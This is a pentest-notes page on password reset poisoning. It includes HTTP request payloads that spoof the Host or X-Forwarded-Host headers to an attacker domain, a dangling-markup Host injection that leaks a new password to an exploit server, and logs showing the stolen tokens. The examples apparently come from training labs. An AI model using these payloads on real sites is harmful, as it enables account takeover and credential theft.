>[!abstract]
>Password reset poisoning is a technique whereby an attacker manipulates a vulnerable website into generating a password reset link pointing to a domain under their control. This behavior can be leveraged to steal the secret tokens required to reset arbitrary users' passwords and, ultimately, compromise their accounts.

## Techniques

- [Host Header attacks](Host%20Header%20attacks.md)
- Poisoning via middleware ([Non-standard headers override](Host%20Header%20attacks.md#Non-standard%20headers%20override)) (`X-Forwarded-Host`, `X-Forwarded-For`, `X-Remote-IP`, `X-Remote-Addr`, `X-Originating-IP`): consider using [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968#:~:text=This%20extension%20augments%20your%20in,and%20browse%20the%20target%20website.)
- [Dangling markup injection](Cross-Site%20Scripting%20(XSS).md#Dangling%20markup%20injection)

>[!warning]
>Some time automated mail filters click link instead of the user!

# Examples

## Password reset poisoning exploiting host header injection

```http
POST /forgot-password HTTP/2
Host: attacker.com
Cookie: _lab=46%7cMCwCFEv0N7cXiXqtk1oVrrJubPt2QQF1AhQ2ZsBKpbO6kY8UeR2RnTnJpPlEf%2b8NOxkqONYHxQ%2blTSTDacB6viwKwduo%2bvsogaO6%2bOzoKeKHLa4%2b8iipp8Sbh1e3LJvj3iwjfQPGjrM19wTxAuRxaC2DEPGsMtOhjxjwraXgKxGGNqg%3d; session=EihnNPBEt8Ad6pIQdAlZ9CgbLSumZchV

csrf=59JNWHRjZGqBYOJchAf689nvQffjeSl3&username=victim
```

Spoofed Host header used to send the password reset secret-token:
> Hello! 
> Please follow the link below to reset your password.
> https://attacker.com/forgot-password?temp-forgot-password-token=YeVH5sp94doHd9wlrPhpL7xIwPZmZ5DJ
> Thanks,
> Support team

If the user clicks, attackers can takeover his account:
```
...
10.0.3.75       2023-04-01 15:17:59 +0000 "GET /forgot-password?temp-forgot-password-token=yd7scgKr0YB4Gkfxc9qPGwyQTZpkVgTL HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
...
```

## Password reset poisoning via middleware

```http
POST /forgot-password HTTP/2
Host: real.site.com
X-Forwarded-Host: attacker.com
Cookie: _lab=46%7cMCwCFEv0N7cXiXqtk1oVrrJubPt2QQF1AhQ2ZsBKpbO6kY8UeR2RnTnJpPlEf%2b8NOxkqONYHxQ%2blTSTDacB6viwKwduo%2bvsogaO6%2bOzoKeKHLa4%2b8iipp8Sbh1e3LJvj3iwjfQPGjrM19wTxAuRxaC2DEPGsMtOhjxjwraXgKxGGNqg%3d; session=EihnNPBEt8Ad6pIQdAlZ9CgbLSumZchV

csrf=59JNWHRjZGqBYOJchAf689nvQffjeSl3&username=victims
```

Spoofed `X-Forwarded-Host` header used to send the password reset secret-token. If the user clicks, attackers can takeover his account.

## Password reset poisoning via dangling markup

The reset password functionality send the new password via email:
```html
Sent:     2023-06-29 20:14:59 +0000
From:     no-reply@0a3f00ce03414c9780ae6733005400d9.web-security-academy.net
To:       wiener@exploit-0a46000703614c3680c46685017b00be.exploit-server.net
Subject:  Account recovery

<p>Hello!</p><p>Please <a href='https://0a3f00ce03414c9780ae6733005400d9.web-security-academy.net/login'>click here</a> to login with your new password: LNJYfitpA2</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
```

A flaw in the Host verification allows to append arbitrary non numeric ports at the end of the domain while sending the password reset request:
```http
POST /forgot-password HTTP/1.1
Host: 0ad900f10337348d84f9a55800a100a7.web-security-academy.net:asd

csrf=OuajjwuCYbadNosdmgl3wXTGD5V4HN8u&username=wiener


Sent:     2023-06-30 08:19:24 +0000
From:     no-reply@0ad900f10337348d84f9a55800a100a7.web-security-academy.net
To:       wiener@change.exploit-0a52004d03e83409844fa43901af00b5.exploit-server.net
Subject:  Account recovery

<p>Hello!</p><p>Please <a href='https://0ad900f10337348d84f9a55800a100a7.web-security-academy.net:asd/login'>click here</a> 
```

We can exploit this flaw to inject an arbitrary image referencing our server and leak part of the email body:
```http
POST /forgot-password HTTP/1.1
Host: 0ad900f10337348d84f9a55800a100a7.web-security-academy.net:'/></a><img src="https://exploit-0a52004d03e83409844fa43901af00b5.exploit-server.net?carlos=

csrf=OuajjwuCYbadNosdmgl3wXTGD5V4HN8u&username=carlos
```

Server response (the integrated AV scanned the link without requiring user interaction):
```html
...
10.0.3.52       2023-06-30 08:48:12 +0000 "GET ?carlos=/login'>click+here</a>+to+login+with+your+new+password:+X5qD9PDfBN</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> HTTP/1.1" 200 
...
```

## Homograph attacks

![Homograph characters](Evading%20Restrictions.md#Homograph%20characters)